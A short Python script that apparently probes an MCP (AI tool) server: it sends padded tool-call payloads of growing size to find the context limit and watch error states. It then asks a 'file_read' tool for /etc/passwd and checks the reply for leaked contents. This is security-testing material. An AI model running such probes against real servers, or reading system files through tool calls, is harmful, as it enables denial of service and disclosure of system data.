#!/usr/bin/env python3
"""
MCP Context Exhaustion Tester
Find the context window limit and test error-state behavior
"""
import requests
import json
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

def send_large_payload(target, size_kb):
    """Send a payload designed to approach context limit"""
    # Generate large text that looks like normal input
    padding = "The following is a detailed report. " * (size_kb * 20)
    
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "analyze",  # Generic analysis tool
            "arguments": {"text": padding + "What is the capital of France?"}
        }
    }
    
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=30)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

def test_context_limit(target):
    print(f"[*] MCP Context Exhaustion Tester")
    print(f"[*] Target: {TARGET}\n")
    
    sizes = [10, 50, 100, 200, 500, 1000]  # KB
    results = []
    
    for size in sizes:
        print(f"[*] Testing {size}KB payload...", end="", flush=True)
        result = send_large_payload(target, size)
        result_str = json.dumps(result)
        
        if "error" in result_str:
            print(f" ERROR: {result_str[:100]}")
            results.append((size, "error", result_str))
        elif len(result_str) > 50000:
            print(f" LARGE RESPONSE ({len(result_str)} bytes)")
            results.append((size, "overflow", result_str))
        elif len(result_str) < 20:
            print(f" EMPTY/TRUNCATED")
            results.append((size, "empty", result_str))
        else:
            print(f" OK ({len(result_str)} bytes)")
            results.append((size, "ok", result_str))
        
        time.sleep(0.5)
    
    print("\n[*] Summary:")
    for size, status, data in results:
        if status != "ok":
            print(f"  [!] {size}KB -> {status.upper()}: {data[:200]}")

def test_error_state_leak(target):
    """After exhausting context, see if error response leaks data"""
    send_large_payload(target, 500)
    payload = {
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "file_read", "arguments": {"path": "/etc/passwd"}}
    }
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=15)
        result = r.json()
        if "root:" in json.dumps(result) or "last_stage_error" in json.dumps(result):
            print("[!] ERROR STATE LEAK: Previous context visible in new request")
    except:
        pass

if __name__ == "__main__":
    test_context_limit(TARGET)
    test_error_state_leak(TARGET)